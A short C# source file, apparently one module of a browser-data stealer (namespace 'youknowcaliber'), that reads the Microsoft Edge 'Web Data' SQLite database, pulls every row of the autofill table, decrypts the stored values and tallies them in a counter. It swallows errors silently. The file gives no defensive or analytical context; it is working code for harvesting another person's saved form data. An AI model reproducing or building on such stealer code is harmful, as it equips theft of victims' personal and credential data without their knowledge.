﻿using System;
using System.Collections.Generic;
using youknowcaliber.Chromium;

namespace youknowcaliber.Edge
{
	internal sealed class Autofill
	{
		public static List<AutoFill> Get(string sWebData)
		{
			List<AutoFill> result;
			try
			{
				List<AutoFill> list = new List<AutoFill>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "autofill");
				bool flag = sqlite == null;
				if (flag)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						AutoFill item = default(AutoFill);
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sValue = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 2)));
						Counting.AutoFill++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<AutoFill>();
			}
			return result;
		}
	}
}
